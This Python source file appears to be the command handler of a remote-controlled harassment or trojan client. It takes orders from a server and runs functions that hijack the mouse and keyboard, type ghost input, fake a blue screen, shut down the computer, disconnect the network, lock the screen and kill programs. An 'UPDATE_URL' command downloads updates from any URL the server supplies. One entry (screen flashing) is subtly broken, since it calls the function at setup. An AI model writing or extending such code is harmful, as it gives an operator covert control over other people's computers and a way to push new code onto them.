import logging
import threading
from server_communication_and_content import (
    show_lock_screen,
    send_message,
    open_browser_and_visit,
    update_from_url
)
from wallpaper_and_shortcut_manager import change_wallpaper
from update_shortcut_icons import update_all_desktop_shortcuts
from input_interference import mouse_interference, keyboard_interference
from blue_screen_simulator import simulate_blue_screen  # 确保已定义并导入
from ghost_typing import ghost_typing  # 确保已定义并导入
from app_manager import open_applications, close_applications  # 添加这两行
from message_manager import random_popup
from program_interference import program_interference
from config_manager import get_server_ip, get_server_port, get_retry_interval, get_heartbeat_interval
from system_command_executor import system_reboot_or_shutdown,open_system_settings,text_conversion
from mouse_click_delay import apply_mouse_click_delay
from mouse_wheel_mess import apply_mouse_wheel_mess
from disconnect_network import disconnect_network
from screen_color_changer import start_color_change

# 解析并执行命令
def execute_command(command):
    try:
        logging.info("接收到命令: %s", command)
        command_map = {
            "随机弹窗": random_popup,  # 确保 random_popup 函数已定义并导入
            "键盘干扰": keyboard_interference,  # 确保 input_interference 函数已定义并导入
            "鼠标干扰": mouse_interference, # 确保 input_interference 函数已定义并导入
            "更改壁纸": change_wallpaper,   # 确保 wallpaper_and_shortcut_manager 函数已定义并导入
            "更改图标": update_all_desktop_shortcuts,   # 确保 update_all_desktop_shortcuts 函数已定义并导入
            "更换图标": update_all_desktop_shortcuts,   # 确保 update_all_desktop_shortcuts 函数已定义并导入
            "文字转化": text_conversion,  # 确保 text_conversion 函数已定义并导入
            "关闭程序": close_applications,  # 确保 close_program 函数已定义并导入
            "程序干扰": program_interference,  # 确保 open_applications 函数已定义并导入
            "幽灵输入": ghost_typing,# 确保 ghost_typing 函数已定义并导入
            "关机": system_reboot_or_shutdown,  # 确保 screen_flash 函数已定义并导入
            "打开程序": open_applications,  # 确保 open_application 函数已定义并导入
            "弹出系统设置": open_system_settings,  # 确保 open_system_settings 函数已定义并导入
            "锁屏": show_lock_screen,
            "打开浏览器": open_browser_and_visit,
            "模拟蓝屏": simulate_blue_screen,
            "鼠标点击延迟": lambda: apply_mouse_click_delay(delay_seconds=5),
            "鼠标滚轮混乱": lambda: apply_mouse_wheel_mess(duration_seconds=10),
            "断网": disconnect_network,
            "屏幕闪烁": start_color_change()
        }

        if command.startswith("发送消息:"):
            message = command[len("发送消息:"):].strip()
            if message:
                threading.Thread(target=send_message, args=(message,), daemon=True).start()
            else:
                logging.warning("未提供有效的消息内容")
        elif command.startswith("UPDATE_URL:"):
            url = command[len("UPDATE_URL:"):].strip()
            threading.Thread(target=update_from_url, args=(url,), daemon=True).start()
        elif command in command_map:
            threading.Thread(target=command_map[command], daemon=True).start()
        else:
            logging.warning("未知命令: %s", command)
    except Exception as e:
        logging.error("执行命令出错: %s", e)

# 处理从服务器接收到的命令
async def handle_server_commands(reader, writer):
    try:
        while True:
            data = await reader.read(1024)
            if not data:
                break
            command = data.decode('utf-8').strip()
            execute_command(command)  # 解析并执行命令
    except Exception as e:
        logging.error("处理服务器命令出错: %s", e)
    finally:
        writer.close()
        await writer.wait_closed()
